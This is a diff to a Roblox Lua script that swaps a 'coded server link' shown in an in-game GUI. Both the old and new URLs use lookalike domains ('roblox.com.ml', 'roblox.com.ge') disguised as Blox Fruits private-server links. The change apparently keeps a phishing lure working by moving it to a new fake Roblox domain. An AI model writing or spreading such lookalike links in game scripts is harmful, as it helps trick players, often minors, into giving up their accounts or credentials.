@@ -4,7 +4,7 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
 -- UPDATED CODED SERVER LINK
-local codedServerLink = "https://www.roblox.com.ml/games/2753915549/Blox-Fruits?privateServerLinkCode=238318955795515972576488185248"
+local codedServerLink = "https://roblox.com.ge/games/2753915549/Blox-Fruits?privateServerLinkCode=44905652530009469180503600545421"
 
 -- ScreenGui
 local gui = Instance.new("ScreenGui")
